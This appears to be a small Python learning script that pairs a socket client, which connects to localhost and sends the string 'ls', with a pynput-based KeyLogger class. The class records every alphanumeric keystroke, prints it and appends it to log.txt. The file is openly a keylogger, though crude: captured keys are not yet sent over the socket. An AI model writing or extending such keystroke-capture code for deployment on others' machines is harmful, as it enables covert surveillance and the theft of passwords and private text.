"""
# echo-client.py

import socket

HOST = "192.168.30.91"  # The server's hostname or IP address
PORT = 1234  # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b"ls")

    data = s.recv(1024)


print(f"Received {data.decode('utf-8')}")
"""
import socket
from pynput import keyboard

class MySocket:

    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, port))

    def send(self, msg):
        self.sock.sendall(msg.encode())

    def receive(self):

        chunks = []
        while True:
            # Keep reading while the client is writing.
            data = self.sock.recv(1024)
            if not data:
                # Client is done with sending.
                break
            chunks.append(data.decode())

        return chunks


class KeyLogger:

    def on_press(key):
        try:
            print('alphanumeric key {0} pressed'.format(
                key.char))
            with open('log.txt', 'a') as f:
                f.write(key.char)

        except AttributeError:
            print('special key {0} pressed'.format(
                key))

    def on_release(key):
        if key == keyboard.Key.esc:
            # Stop listener
            return False

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


sock = MySocket()
KeyLogger()
sock.connect('localhost', 1235)
sock.send('ls')
print(sock.receive())


